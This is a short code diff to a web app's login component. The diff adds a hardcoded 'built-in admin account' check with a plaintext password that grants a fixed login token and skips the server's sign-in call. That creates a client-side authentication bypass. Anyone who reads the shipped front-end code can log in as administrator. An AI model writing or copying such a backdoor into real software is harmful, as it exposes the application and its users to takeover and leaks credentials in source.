@@ -71,6 +71,15 @@ export function AuthView() {
 
     try {
       if (isLogin) {
+        // Check for built-in admin account
+        if (identifier.trim() === 'admin' && password === 'Ili@1382') {
+          login('admin-builtin-token');
+          toast.success(t.success[language]);
+          navigate('/');
+          setIsSubmitting(false);
+          return;
+        }
+
         const response = await api.auth.signin({
           username_or_email: identifier.trim(),
           password
